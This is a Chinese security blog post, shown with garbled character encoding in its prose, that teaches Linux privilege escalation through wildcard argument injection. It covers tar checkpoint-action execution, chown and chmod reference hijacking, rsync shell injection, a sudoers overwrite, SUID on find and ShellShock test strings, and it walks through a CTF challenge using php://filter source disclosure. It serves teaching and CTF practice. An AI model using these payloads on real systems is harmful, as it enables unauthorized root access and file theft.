---
title: å‘½ä»¤æ‰§è¡Œåˆ°ææƒ
authorId: Zedd
tags:
  - RCE
categories:
  - Web å®‰å…¨
date: 2019-03-12 13:44:47
---


> â€‹	æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼šhttps://xz.aliyun.com/t/4309

ä¹‹å‰åœ¨è¡¥å¤©å¹³å°é¦–å‘äº†[å·§ç”¨å‘½ä»¤æ³¨å…¥çš„Nç§æ–¹å¼](https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw)ï¼Œçœ‹åˆ°äº†æœ‰å‡ ä¸ªå¸ˆå‚…è¡ç”Ÿå‡ºäº†ä¸åŒçš„å‡ ä¸ªåç»­ç‰ˆæœ¬ï¼Œéƒ½æ„Ÿè§‰æŒºä¸é”™çš„ï¼Œå¯¹æˆ‘çš„ç‰ˆæœ¬è¿›è¡Œäº†ä¸€äº›è¡¥å……ã€‚æœ¬æ¥è¿™ä¸ªæ€»ç»“åº”è¯¥ç®—æ˜¯å‰åŠéƒ¨åˆ†ï¼Œæƒ³å†™çš„è¿˜æ²¡å†™å®Œï¼Œå½“æ—¶åˆæ˜¯åœ¨è€ƒè¯•å‘¨ï¼ŒåŸæœ¬æƒ³åœ¨è€ƒè¯•ç»“æŸåå°±æ¥å†™ååŠéƒ¨åˆ†ï¼Œåˆå› ä¸ºå„ç§äº‹ç»™æ¨æ‰äº†ã€‚æ‰€ä»¥ç°åœ¨æ¥å†™ååŠéƒ¨åˆ†æå‡ç¯‡ï¼Œä¹Ÿç®—æ˜¯å¯¹å‰åŠéƒ¨åˆ†çš„è¡¥å……ä¸è§£é‡Šã€‚

<!--more-->

[TOC]

##	ææƒ

è¿™é‡Œæˆ‘ä»¬è®²è®²åœ¨å‘½ä»¤æ³¨å…¥ä¸­æ›´æœ‰æ„æ€çš„ä¸€ç§æ–¹æ³•ã€‚

###	Wildcard Wilderness

####	Example 1

é¦–å…ˆæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªç¤ºä¾‹

```bash
echo "Hello Friends" > file1
echo "This is wildcard Injection" >file2
echo "take help" > --help
```

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g076e1djwtj21f207ugnv.jpg)

é¦–å…ˆåˆ›å»ºå‡ ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæ˜¯`--help`ï¼Œç„¶åä½¿ç”¨`cat`å‘½ä»¤è¯»å–æ–‡ä»¶å†…å®¹

```bash
cat file1
cat file 2
cat --help
```

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g076fskjccj21eo112k0s.jpg)

å¦‚æœæŒ‰ç…§æˆ‘ä»¬é¢„æœŸçš„ï¼Œæ˜¯ä¸æ˜¯åœ¨ç¬¬ä¸‰ä¸ª`cat --help`å¤„åº”è¯¥æ˜¯è¦è¯»å–`â€”help`æ–‡ä»¶çš„å†…å®¹å‘¢ï¼Ÿç„¶è€Œæˆ‘ä»¬æ‰§è¡Œ`cat â€”help`å´ä¼˜å…ˆæ‰§è¡Œäº†`cat`å‘½ä»¤çš„å¸®åŠ©é€‰é¡¹ï¼Œå¹¶æ²¡æœ‰è¯»å‡º`â€”help`é‡Œçš„å†…å®¹ã€‚

ä¸ä»…æ˜¯`cat`ï¼Œ`ls`ç­‰å‘½ä»¤ä¹Ÿä¼šä¼˜å…ˆè°ƒç”¨å†…ç½®`--help`é€‰é¡¹ã€‚

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g076nnhf03j21ce11udpn.jpg)

ä»¥åŠè¿˜æœ‰`--all`é€‰é¡¹ã€‚

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g076ud4xu3j21g00byq6p.jpg)

å…¶å®è®²é“ç†ï¼Œè¯æ³•åˆ†ææŠŠå¯¹è¯¸å¦‚`--help`ã€`--all`ç­‰é€‰é¡¹ä¼˜å…ˆå¤„ç†ä¸ºå†…ç½®é€‰é¡¹è¾“å‡ºï¼Œçœ‹èµ·æ¥å¹¶æ²¡æœ‰ä»»ä½•é—®é¢˜

è¿™ä¸ªæŠ€å·§å«åš`Wildcard wildness`ï¼Œä¸­æ–‡æœ‰äººè¯‘ä¸ºé€šé…ç¬¦åœ¨é‡ã€‚(`-all`ã€`--help`å¯ä»¥é€šè¿‡åŠ å…¥`./`æˆ`./-all`ã€`./--help`æ¥ç‰¹æŒ‡è¿™ä¸ªæ–‡ä»¶ï¼Œé¿å…è¿™ä¸ªé—®é¢˜)



####	Example 2

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g077ky6brvj21de0e0whf.jpg)

å¦‚å›¾ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œå½“ç”¨`rm *`çš„æ—¶å€™ï¼Œåªåˆ æ‰äº†`file1`ä¸`file2`ï¼Œå¹¶æ²¡æœ‰åˆ é™¤`*`

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g077v4la9oj21bc096myu.jpg)

æˆ–è€…ä½¿ç”¨`rm file1 file2 -rf`é€ä¸ªåˆ é™¤ä¹‹æ—¶ï¼Œä¹Ÿåªåˆ æ‰äº†`file1`ä¸`file2`

ä½¿ç”¨`strace rm *`æˆ‘ä»¬å¯ä»¥å‘ç°

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g077xmkqqfj21cs04m0tv.jpg)

ç”±äºå½“å‰ç›®å½•ä¸­å­˜åœ¨`-rf`æ–‡ä»¶åï¼Œ`rm`å°†`-rf`é€‰é¡¹ä½œä¸ºæœ€åä¸€ä¸ªå‚æ•°ï¼Œå¹¶ä¸”é€’å½’åˆ é™¤å½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ã€‚åŒæ ·ï¼Œè‹¥è¦åˆ é™¤å¯ä»¥åŠ ä¸Š`./-rf`è¿›è¡Œåˆ é™¤



###	Trick

æˆ‘ä»¬å¯ä»¥åˆ©ç”¨`Wildcard Wilderness`åšä¸€äº›æ›´æœ‰ç”¨çš„äº‹æƒ…ã€‚

####	File Owner Hijacking

ç°åœ¨æˆ‘ä»¬æœ‰ä¸‰ä¸ªç”¨æˆ·ï¼Œä¸€ä¸ª`zedd`ï¼Œä¸€ä¸ª`test`ï¼Œä¸€ä¸ª`root`ç”¨æˆ·ã€‚

æˆ‘ä»¬åˆ†åˆ«ç”¨`zedd`ä¸`test`åˆ›å»ºäº†ä¸åŒçš„æ–‡ä»¶ï¼Œ`1.php`ä¸`test.php`éƒ½å±äº`test`ç”¨æˆ·çš„æ–‡ä»¶ï¼Œ`zedd.php`ä¸`--reference=zedd.php`å‡å±äº`zedd`ç”¨æˆ·çš„æ–‡ä»¶ã€‚

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g07b75pccgj219e0bajti.jpg)

ç„¶åä½¿ç”¨`root`ç”¨æˆ·ä½¿ç”¨`chown -R test:test *.php`å‘½ä»¤ï¼Œæƒ³æŠŠæœ¬ç›®å½•ä¸‹æ‰€æœ‰çš„`.php`æ–‡ä»¶ä¿®æ”¹ä¸º`test`ç”¨æˆ·æ‰€æœ‰ã€‚

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g07bake27zj21bs11gagh.jpg)

ä½†æ˜¯ç»“æœæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œç»“æœè¯¥ç›®å½•ä¸‹æ‰€æœ‰çš„`.php`æ–‡ä»¶éƒ½è¢«ä¿®æ”¹ä¸ºäº†`zedd`ç”¨æˆ·æ‰€æœ‰ï¼ŒæˆåŠŸâ€œææƒâ€ã€‚

åŸç†æˆ‘ä»¬å¯ä»¥ç”¨`strace chown -R zedd:zedd *.php`æ¥çœ‹ä¸€ä¸‹ï¼ˆæ³¨æ„è¿™é‡Œæ¢äº†ä¸€ä¸‹ï¼Œæ¨¡æ‹Ÿæƒ³æŠŠ`.php`æ–‡ä»¶æ”¹å˜æˆ`zedd`ç”¨æˆ·æ‰€æœ‰ï¼‰

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g07bmvx77bj21bq0iwgqg.jpg)

æˆ‘ä»¬å¯ä»¥çœ‹åˆ°

```bash
execve("/bin/chown", ["chown", "-R", "zedd:zedd", "config.php", "index.php", "--reference=.backdoor.php"], 0x7ffe5b43b1e8 /* 35 vars */) = 0
```

è·Ÿæˆ‘ä»¬ä¸Šä¸ªä¾‹å­åŸç†å…¶å®ä¸€æ ·ï¼Œ`--reference=.backdoor.php`è¢«ä½œä¸ºä¸€ä¸ªé€‰é¡¹è¿›è¡Œäº†å¤„ç†ï¼Œè€Œ

```
--reference=RFILE  use RFILE's owner and group rather than
                         specifying OWNER:GROUP values
```

`--reference=RFILE`è¿™ä¸ªé€‰é¡¹åˆ™æ˜¯ä½¿ç”¨`RFILE`çš„æ–‡ä»¶æ‹¥æœ‰è€…å’Œç”¨æˆ·ç»„æ¥æ”¹å˜æ–‡ä»¶å±æ€§ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ä¼ å…¥çš„`OWNER:GROUP`å‚æ•°ã€‚

å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ`chown`çš„`--reference`é€‰é¡¹å°†è¦†ç›–æŒ‡å®šä¸º`root`ç”¨æˆ·è¾“å…¥çš„å‚æ•°`zedd:zedd`ï¼ŒæŠŠæ­¤ç›®å½•ä¸­æ‰€æœ‰`.php`æ–‡ä»¶çš„æ‰€æœ‰è€…æ”¹å˜ä¸`.backdoor.php`çš„æ‰€æœ‰è€…`test`ã€‚

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g07bmvq2pzj21cm0awq5f.jpg)

æ‰€ä»¥ï¼ŒæŒ‰ç…§è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åŠ«æŒ`root`å°†æ–‡ä»¶çš„æ‰€æœ‰æƒæ›´æ”¹ä¸ºä»»æ„ç”¨æˆ·ï¼Œå¹¶â€œåŠ«æŒâ€æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶ã€‚



####	Chmod File Reference

ç±»ä¼¼`chown`çš„è¿˜æœ‰ä¸€ä¸ªå‘½ä»¤`chmod`ï¼Œå®ƒä¹Ÿæœ‰`--reference=RFIE`çš„é€‰é¡¹

```bash
--reference=RFILE  use RFILE's mode instead of MODE values
```

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g07hbgxzjqj21ba11otf9.jpg)

ä¸`chown`ç±»ä¼¼ï¼Œå› ä¸ºæœ‰`--reference=.backdoor.php`çš„å­˜åœ¨ï¼Œåœ¨ä½¿ç”¨`chmod 000 *`çš„æ—¶å€™ä¹Ÿä¼šæŠŠåŠ«æŒåˆ°ä¸`.backdoor.php`æ–‡ä»¶æƒé™ä¸€æ ·çš„æƒé™



####	Tarå‘½ä»¤åˆ©ç”¨

é¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹`tar`å‘½ä»¤å¸®åŠ©æ–‡æ¡£ä¸­çš„å‡ ä¸ªæœ‰æ„æ€çš„é€‰é¡¹

```bash
--checkpoint[=NUMBER]  
	display progress messages every NUMBERth record (default 10)
--checkpoint-action=ACTION   
	execute ACTION on each checkpoint
```

ä»å¸®åŠ©æ–‡æ¡£ï¼Œæˆ‘ä»¬å¤§è‡´å¯ä»¥ä»ä¸­ç†è§£åˆ°ï¼Œ`--checkpoint=1`å¯ä»¥ç”¨æ¥æ˜¾ç¤ºä¿¡æ¯ï¼Œ`--checkpoint-action=exec=sh shell.sh`å¯ä»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤

å…ˆå°è¯•æ„å»ºä¸€ä¸ª`shell.sh`è„šæœ¬ï¼Œå†…å®¹ä¸º`/usr/bin/id`ï¼Œä»¥åŠæ–‡ä»¶åä¸º`--checkpoint=1`ä¸`--checkpoint-action=exec=sh shell.sh`çš„æ–‡ä»¶ï¼Œä½¿ç”¨`tar -cf test.tar *`æŠŠå½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å‹ç¼©åˆ°`test.tar`å‹ç¼©åŒ…å†…

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g07j2zpkzpj219k104n3g.jpg)

å¯è§ï¼Œ`/usr/bin/id`å·²ç»è¢«æˆåŠŸæ‰§è¡Œè¾“å‡ºã€‚

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g07jecrkqfj222s18uwqp.jpg)

ä¸ä¹‹å‰ä¸€æ ·ï¼Œ`--checkpoint=1`ä¸`--checkpoint-action=exec=sh shell.sh`è¢«ä½œä¸ºé€‰é¡¹å¤„ç†

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g07j1zh92pj21aw0feq6h.jpg)



åœ¨ 2018 SWPUCTF ä¸Šæœ‰ä¸€é“ web é¢˜è€ƒç‚¹ä¹Ÿæ­£æ˜¯åˆ©ç”¨äº†è¿™ä¸ªç‚¹ï¼Œç”±äºé¢˜ç›®å®˜æ–¹æ²¡æœ‰å¼€æºï¼Œè¿™é‡Œç»™ä¸€ä¸ªæ¯”è¾ƒè¯¦ç»†çš„ @ä¸€å¶é£˜é›¶ å¸ˆå‚…å†™çš„ wp ç”¨äºå‚è€ƒå­¦ä¹ : [2018SWPUCTF-Web#ä¿¡æ¯å†æ¬¡å‘æ˜](https://skysec.top/2018/12/17/2018SWPUCTF-Web/#%E4%BF%A1%E6%81%AF%E5%86%8D%E6%AC%A1%E5%8F%91%E6%8E%98)



####	rsyncå‘½ä»¤åˆ©ç”¨

`rsync`å‘½ä»¤å¯èƒ½æ¯”è¾ƒå°‘ç”¨ï¼Œæˆ‘ä»¬è¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹

> NAME
>
> â€‹	rsync - a fast, versatile, remote (and local) file-copying tool

`rsync`å‘½ä»¤æ˜¯ä¸€ä¸ªè¿œç¨‹æ•°æ®åŒæ­¥å·¥å…·ï¼Œå¯é€šè¿‡LAN/WANå¿«é€ŸåŒæ­¥å¤šå°ä¸»æœºé—´çš„æ–‡ä»¶ã€‚ä½¿ç”¨ä¸€ä¸ªè¿œç¨‹shellç¨‹åº(å¦‚[rsh](http://man.linuxde.net/rsh)ã€[ssh](http://man.linuxde.net/ssh))æ¥å®ç°å°†æœ¬åœ°æœºå™¨çš„å†…å®¹æ‹·è´åˆ°è¿œç¨‹æœºå™¨ã€‚å¦‚ï¼š`rsync -t *.c foo:src`ï¼Œå¤åˆ¶å½“å‰æœ¬åœ°æ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰çš„`.c`æ–‡ä»¶åˆ° foo è¿œç¨‹æœåŠ¡å™¨çš„`/src`æ–‡ä»¶å¤¹ä¸‹ã€‚

`rsync`å¸®åŠ©æ–‡æ¡£å«æœ‰ä»¥ä¸‹å‡ ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„é€‰é¡¹

```bash
-e, --rsh=COMMAND           specify the remote shell to use
    --rsync-path=PROGRAM    specify the rsync to run on remote machine
```

`--rsh=COMMAND`åˆæ˜¯ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸º`-e sh shell.c`çš„æ–‡ä»¶ï¼Œç„¶åå†åˆ›å»ºä¸€ä¸ª`shell.c`æ–‡ä»¶ï¼Œæ±¡æŸ“`rsync`å‚æ•°æ¥å®ç°æ‰§è¡Œæˆ‘ä»¬åœ¨`shell.c`ä¸­å†™å…¥çš„é¢„æœŸå‘½ä»¤

å‡è®¾å½“å‰ç›®å½•ä¸‹æˆ‘ä»¬æ‹¥æœ‰ä¸€ä¸ªåªæœ‰`root`ç”¨æˆ·å¯è¯»çš„`rootfile`æ–‡ä»¶ï¼Œç”±äºä¸èƒ½ç›´æ¥è¾“å‡ºç»“æœï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ `cat ./rootfile > ./output`ï¼Œå°†æ–‡ä»¶å†…å®¹è¯»å‡ºã€‚

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g07kovadxzj21900zq44l.jpg)

å¾—åˆ°çš„`output`æ–‡ä»¶æ˜¯ 644 çš„æƒé™ï¼Œè¿™æ ·æˆ‘ä»¬å°±æˆåŠŸæ„é€ äº†ä¸€ä¸ªææƒè¯»å–çš„æ–‡ä»¶çš„ payload ï¼Œè¿™é‡Œå¯èƒ½éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªèƒ½æå–åˆ°æ‰§è¡Œ`rsync`ç”¨æˆ·çš„æƒé™ï¼Œä¸æ˜¯ç›´æ¥çš„`root`æƒé™ï¼Œè¿™é‡Œå› ä¸ºæ‰§è¡Œå‘½ä»¤çš„æ˜¯`root`æƒé™ï¼Œæ‰€ä»¥èƒ½è¯»å–åªæœ‰`root`ç”¨æˆ·æ‰èƒ½è¯»å–çš„`rootfile`æ–‡ä»¶



####	Tips

* æ—¢ç„¶èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥å‚ç…§ä¸Šç¯‡åˆ—ä¸¾çš„åå¼¹ shell çš„æ–¹å¼å°† shell åå¼¹ç»™æˆ‘ä»¬ï¼Œä¹Ÿå¯ä»¥é…åˆ`msfvenom`æ¥ä½¿ç”¨ã€‚

* `tar`å‘½ä»¤æ¯”è¾ƒå¤šçš„éƒ½ç”¨åœ¨`/etc/crontab`è®¡åˆ’ä»»åŠ¡ä¸­ï¼Œç»å¸¸ä¼šæœ‰ç®¡ç†å‘˜ä¼šç”¨`crontab`æ¥æ‰§è¡Œä¸€äº›`tar`å‘½ä»¤çš„å¤‡ä»½æ“ä½œï¼Œè€Œä¸”`crontab`æ‰§è¡Œçš„æƒé™è¿˜æ˜¯`root`æƒé™ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸ªå¾ˆå¥½åˆ©ç”¨çš„ç‚¹

* `tar`å‘½ä»¤éœ€è¦è¿›å…¥åˆ°`--checkpoint=1`æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å†…ï¼Œå¦‚æœåŠ ä¸Šç»å¯¹è·¯å¾„å°†ä¼šå¤±æ•ˆï¼Œä¾‹å¦‚`tar cf test.tar /var/www/html/*`

  ![](https://ws1.sinaimg.cn/large/64ef14dcgy1g086tan6s4j21ba05owfx.jpg)

  æˆ‘ä»¬å¯ä»¥çœ‹åˆ° shell å¤„ç†æ–¹å¼å°†`/home/zedd/Desktop/test`ä¸ç›®å½•ä¸‹çš„æ–‡ä»¶åé€ä¸ªæ‹¼æ¥èµ·æ¥ï¼Œå°±è¾¾ä¸åˆ°æ±¡æŸ“å‚æ•°çš„æ•ˆæœäº†

* è¿˜å¯ä»¥ç”¨`echo "zedd ALL=(root) NOPASSWD: ALL" > /etc/sudoers`ï¼ŒæŠŠè‡ªå·±ç›´æ¥å†™å…¥ç®¡ç†å‘˜ç»„

* åˆ©ç”¨`chmod u+s /usr/bin/find`æå‡ä¸º`root`æƒé™æ‰§è¡Œï¼Œé…åˆ`find`å‘½ä»¤çš„`-exec COMMAND`æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¾‹å¦‚`find f1 -exec "whoami" \;`

  ![](https://ws1.sinaimg.cn/large/64ef14dcgy1g086yus96kj21bg0e0jul.jpg)

  





æ–‡ç« ä¸­è®¨è®ºçš„æŠ€æœ¯å¯ä»¥ä»¥ä¸åŒçš„å½¢å¼åœ¨å„ç§æµè¡Œçš„Unixå·¥å…·ä¸Šåº”ç”¨ï¼Œè¿™é‡Œä»…ä»…æ˜¯æŠ›ç –å¼•ç‰ï¼Œåˆ—ä¸¾ä¸€éƒ¨åˆ†å‘½ä»¤ã€‚ åœ¨å®é™…æ”»å‡»ä¸­ï¼Œä»»æ„ shell é€‰é¡¹/å‚æ•°éƒ½å¯ä»¥éšè—åœ¨å¸¸è§„æ–‡ä»¶ä¸­ï¼Œç®¡ç†å‘˜ä¹Ÿä¸å®¹æ˜“å‘ç°ï¼Œæ¯”å¦‚ä½¿ç”¨`.backdoor.php`ç­‰å½¢å¼ã€‚



###	Other

è¿™é‡Œè®²è®²å‡ ä¸ªè™½ç„¶ä¸å±äºææƒï¼Œä½†æ˜¯ä¹Ÿæ¯”è¾ƒæœ‰æ„æ€çš„å‡ ä¸ªç‚¹ã€‚

#### Echo

`echo *`å¯ä»¥ç”¨æ¥æ˜¾ç¤ºç›®å½•ï¼Œ`echo /???g`å¯ä»¥ç”¨æ¥æ¢æµ‹æ–‡ä»¶

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g09eo8qpidj21ci05u75i.jpg)



####	ln

> NAME
>
> â€‹	ln - make links between files

`ln`å‘½ä»¤å¸¸å¸¸ç”¨äºé“¾æ¥ä¸¤ä¸ªæ–‡ä»¶ï¼Œè€Œä¸”åˆ†ä¸¤ç§é“¾æ¥æ¨¡å¼ï¼Œä¸€ç§ç¡¬é“¾æ¥ä¸€ç§è½¯é“¾æ¥ï¼Œè¯¦ç»†å¯ä»¥å‚è€ƒ[ç†è§£Linuxç¡¬é“¾æ¥ä¸è½¯é“¾æ¥](https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html)ã€‚è¿™é‡Œä¸»è¦è®²è®²è½¯é“¾æ¥ï¼Œè½¯é“¾æ¥ç›¸å½“äºæˆ‘ä»¬ Windows ä¸­çš„å¿«æ·æ–¹å¼ï¼Œå¯ä»¥ä½¿ç”¨`ln -s`åˆ›å»º

ä¾‹å¦‚ï¼Œè¿™é‡Œæˆ‘ä»¬æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªæ–‡ä»¶å†…å®¹ä¸º`flag{xxx}`çš„åä¸º`flag`æ–‡ä»¶ï¼Œæˆ‘ä»¬ä½¿ç”¨`ln -s /flag file`ï¼Œåœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª`file`æ–‡ä»¶é“¾æ¥åˆ°`/flag`ï¼Œä½¿ç”¨`cat file`ä¸`php -r "echo file_get_contents('file')" `å‡å¯ä»¥è¯»å–åˆ°`/flag`çš„å†…å®¹ã€‚

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g087vd79anj21ck11w79s.jpg)

è¿™ä¸ªè½¯é“¾æ¥è¯»å–æ–‡ä»¶å†…å®¹å·²ç»è¢«å¤šæ¬¡åˆ©ç”¨

* åœ¨ GitLab CVE-2016-9086 ä¹Ÿæ˜¯åˆ©ç”¨äº†è¿™ç‚¹ï¼Œå‚è€ƒ[GitLab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ (CVE-2016-9086) å’Œä»»æ„ç”¨æˆ· token æ³„éœ²æ¼æ´](https://paper.seebug.org/104/)
* CTF ä¸­ä¹Ÿå‡ºç°äº†ç±»ä¼¼çš„é¢˜ç›®ï¼Œå‚è€ƒ[ä¸€ä¸ªæœ‰è¶£çš„ä»»æ„æ–‡ä»¶è¯»å–](https://xz.aliyun.com/t/2589)ï¼Œä»¥åŠåœ¨ 2018 å¹´èµ›åšåœ°çƒæ¯ä¸Šæœ‰ä¸€é“é¢˜ä¹Ÿæ˜¯åˆ©ç”¨è¿™ä¸ªç‚¹ï¼Œå‚è€ƒ[è®°å½•ä¸€é“é¢˜çš„å¤šç§è§£æ³•](https://cl0und.github.io/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/)ï¼Œ[â€œèµ›åšåœ°çƒæ¯â€å·¥ä¸šäº’è”ç½‘å®‰å…¨å¤§èµ›çº¿ä¸Šèµ›Writeup](https://www.xctf.org.cn/library/details/cyberearth-writeup/?from=groupmessage&isappinstalled=0)



####	ShellShock(CVE-2014-6271)

Bash 4.3ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬åœ¨å¤„ç†æŸäº›æ„é€ çš„ç¯å¢ƒå˜é‡æ—¶å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œå‘ç¯å¢ƒå˜é‡å€¼å†…çš„å‡½æ•°å®šä¹‰åæ·»åŠ å¤šä½™çš„å­—ç¬¦ä¸²ä¼šè§¦å‘æ­¤æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´æ”¹å˜æˆ–ç»•è¿‡ç¯å¢ƒé™åˆ¶ï¼Œä»¥æ‰§è¡Œä»»æ„çš„ shell å‘½ä»¤ï¼Œç”šè‡³å®Œå…¨æ§åˆ¶ç›®æ ‡ç³»ç»Ÿï¼Œè¯¦ç»†åˆ†æå‚è€ƒ[ç ´å£³ï¼ˆShellShockï¼‰æ¼æ´æ ·æœ¬åˆ†ææŠ¥å‘Š](https://www.freebuf.com/articles/system/45390.html)

> * CVE-2014-6271 æµ‹è¯•æ–¹å¼:
>
>   env x='() { :;}; echo vulnerable' bash -c "echo this is a test" 
>
> * CVE-2014-7169 æµ‹è¯•æ–¹å¼:(CVE-2014-6271è¡¥ä¸æ›´æ–°åä»ç„¶å¯ä»¥ç»•è¿‡)
>   env -i X=';() { (a)=>\' bash -c 'echo date'; cat echo



####	ä»ä¸€é“é¢˜çœ‹Shell Shock

é¢˜ç›®åœ°å€ï¼š[command-executor](https://command-executor.hackme.inndy.tw/index.php)â€”â€”æ¥æºäº [HackMe](https://hackme.inndy.tw)

é¢˜ç›®æè¿°ï¼š

> â€‹	Here's my useless developer assistant website, try to execute your own command!

é¢˜ç›®å¤§ä½“æ€è·¯æ˜¯ï¼š

* è¯»å–æºç 
* Shell Shockå‘½ä»¤æ‰§è¡Œ
* é‡å®šå‘è¯»å†™æ–‡ä»¶

é¢˜ç›®è®¾ç½®ä¸ºå‡ ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ª`man`å‘½ä»¤çš„å¸®åŠ©æ–‡æ¡£

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g089zwyjecj227y172dpp.jpg)

é€‰æ‹©äº†`ls`ï¼Œå¤šäº†ä¸ªè¯·æ±‚å‚æ•°`file=ls`

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g08a0lt3utj228016wdn6.jpg)

å°è¯•ç”¨å…¶ä»–å‘½ä»¤ï¼Œæ¯”å¦‚`find`

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g08pjvce8uj2280170tit.jpg)

çŒœæµ‹`eval("man /bin/" + command)`æˆ–è€…ä¸€äº›å…¶ä»–çš„ç›®å½•

`Tar Tester`ç•Œé¢å¯ä»¥ä¸Šä¼ å‹ç¼©åŒ…ä½†æ˜¯å¹¶æ²¡æœ‰è§£å‹ï¼Œåªæ˜¯`tar -tvf test.tar`æŸ¥çœ‹å‹ç¼©åŒ…å†…çš„å†…å®¹

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g08pkqonlij228016kafc.jpg)

`Cmd Exec`ç•Œé¢åªæœ‰ä¸¤ä¸ªå‘½ä»¤ï¼Œä¸€ä¸ª`ls`ï¼Œä¸€ä¸ª`env`

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g08pm4adlij228018ydpt.jpg)

`List files`æ˜¯ä¸ªç›®å½•åˆ—ä¸¾ç•Œé¢ï¼Œå¯ä»¥åˆ—ä¸¾å‡ ä¸ªç›®å½•

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g08pn7gs2ij228016oahz.jpg)

è§‚å¯Ÿé¢˜ç›®ï¼Œé¢˜ç›® url`https://command-executor.hackme.inndy.tw/index.php?func=untar`ç­‰å‡å¸¦æœ‰`func=xxx`å‚æ•°æ¥å±•ç¤ºé¡µé¢ï¼ŒçŒœæµ‹ä¼šæœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°è¯•ä½¿ç”¨`func=php://filter/read=convert.base64-encode/resource=index`è¯»å–æ–‡ä»¶å†…å®¹ï¼ŒæˆåŠŸå¾—åˆ°å›æ˜¾

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g08pqla9xjj228016uk3z.jpg)

è§£ç å¾—åˆ° `index.php`æºç 

```php+HTML
<?php
$pages = [
    ['man', 'Man'],
    ['untar', 'Tar Tester'],
    ['cmd', 'Cmd Exec'],
    ['ls', 'List files'],
];

function fuck($msg) {
    header('Content-Type: text/plain');
    echo $msg;
    exit;
}

$black_list = [
    '\/flag', '\(\)\s*\{\s*:;\s*\};'
];

function waf($a) {
    global $black_list;
    if(is_array($a)) {
        foreach($a as $key => $val) {
            waf($key);
            waf($val);
        }
    } else {
        foreach($black_list as $b) {
            if(preg_match("/$b/", $a) === 1) {
                fuck("$b detected! exit now.");
            }
        }
    }
}

waf($_SERVER);
waf($_GET);
waf($_POST);

function execute($cmd, $shell='bash') {
    system(sprintf('%s -c %s', $shell, escapeshellarg($cmd)));
}

foreach($_SERVER as $key => $val) {
    if(substr($key, 0, 5) === 'HTTP_') {
        putenv("$key=$val");
    }
}

$page = '';

if(isset($_GET['func'])) {
    $page = $_GET['func'];
    if(strstr($page, '..') !== false) {
        $page = '';
    }
}

if($page && strlen($page) > 0) {
    try {
        include("$page.php");
    } catch (Exception $e) {
    }
}

function render_default() { ?>
<p>Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.</p>

<img src="windows-run.jpg" alt="command executor">
<?php }
?><!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Command Executor</title>
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
    <link rel="stylesheet" href="comic-neue/font.css" media="all">
    <style>
      nav { margin-bottom: 1rem; }
      img { max-width: 100%; }
    </style>
  </head>
  <body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
      <a class="navbar-brand" href="index.php">Command Executor</a>

      <ul class="navbar-nav">
